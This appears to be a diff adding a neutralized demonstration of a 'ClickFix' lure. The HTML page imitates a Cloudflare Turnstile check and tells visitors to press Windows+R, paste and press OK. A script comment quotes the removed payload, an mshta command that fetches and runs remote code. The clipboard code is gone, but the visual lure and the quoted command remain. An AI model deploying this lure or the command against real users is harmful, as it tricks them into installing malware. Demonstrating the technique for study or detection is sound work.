@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#1a1a1a;color:#ccc;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:3rem 1.5rem}
+
+/* ── Page chrome ──────────────────────────────────────────── */
+.page-title{font-size:1.6rem;color:#888;font-weight:400;margin-bottom:.4rem;align-self:flex-start;max-width:560px;width:100%}
+.page-subtitle{font-size:1rem;color:#777;margin-bottom:1.5rem;align-self:flex-start;max-width:560px;width:100%}
+
+/* ── Turnstile widget ─────────────────────────────────────── */
+.turnstile{background:#f0f0f0;border:1px solid #d5d5d5;border-radius:4px;padding:.6rem .8rem;display:flex;align-items:center;gap:.6rem;margin-bottom:1.5rem;min-width:280px;align-self:flex-start;max-width:560px}
+.turnstile .check{width:22px;height:22px;background:#f48120;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.turnstile .check svg{width:14px;height:14px}
+.turnstile .label{font-size:.88rem;color:#333;flex:1}
+.turnstile .cf-logo{display:flex;flex-direction:column;align-items:center;margin-left:auto}
+.turnstile .cf-logo .shield{width:28px;height:28px;background:#f48120;clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:block}
+.turnstile .cf-logo span{font-size:.4rem;color:#888;margin-top:2px;text-transform:uppercase;letter-spacing:.03em}
+
+.page-notice{font-size:.88rem;color:#666;margin-bottom:2rem;align-self:flex-start;max-width:560px;width:100%}
+
+/* ── Extra Verification overlay ───────────────────────────── */
+.overlay{background:#333;border-radius:10px;padding:1.5rem 2rem;max-width:560px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,.4)}
+.overlay h3{font-size:1rem;font-weight:700;color:#e8e8e8;margin-bottom:1rem}
+.overlay ol{list-style:none;padding:0;margin:0 0 1rem;counter-reset:verify-step}
+.overlay ol li{font-size:.88rem;color:#ccc;padding:.25rem 0;line-height:1.6;counter-increment:verify-step}
+.overlay ol li::before{content:counter(verify-step) ". ";color:#999}
+.overlay ol li strong{color:#fff;font-weight:700}
+.overlay .footer{font-size:.72rem;color:#888;font-style:italic}
+.overlay .footer strong{color:#aaa;font-weight:600}
+</style></head><body>
+
+<!-- Page chrome — mimics Cloudflare Turnstile challenge page -->
+<div class="page-title">capchabot.cc</div>
+<div class="page-subtitle">Verify you are human by completing the action below.</div>
+
+<div class="turnstile">
+  <div class="check">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <span class="label">Verify you are human</span>
+  <div class="cf-logo"><span class="shield"></span><span>Cloudflare</span></div>
+</div>
+
+<p class="page-notice">capchabot.cc needs to review the security of your connection before proceeding.</p>
+
+<!-- ClickFix lure — instructs user to open Run dialog and paste -->
+<div class="overlay">
+  <h3>Extra Verification Needed</h3>
+  <ol>
+    <li>Press <strong>Windows + R</strong> to open the Run dialog.</li>
+    <li>Paste the verification text by pressing <strong>CTRL + V</strong>.</li>
+    <li>Press <strong>OK</strong> to verify you're not a robot.</li>
+  </ol>
+  <div class="footer">Performance &amp; security by <strong>Cloudflare</strong></div>
+</div>
+
+<script>
+// NEUTRALIZED — clipboard staging removed for safe demonstration
+// Original: copies "mshta [origin]/recaptcha-verify # ✅ I am not a robot" to clipboard
+// on Turnstile checkbox interaction, then instructs Win+R → Ctrl+V → Enter
+// This version only shows the visual lure without touching the clipboard
+</script>
+</body></html>
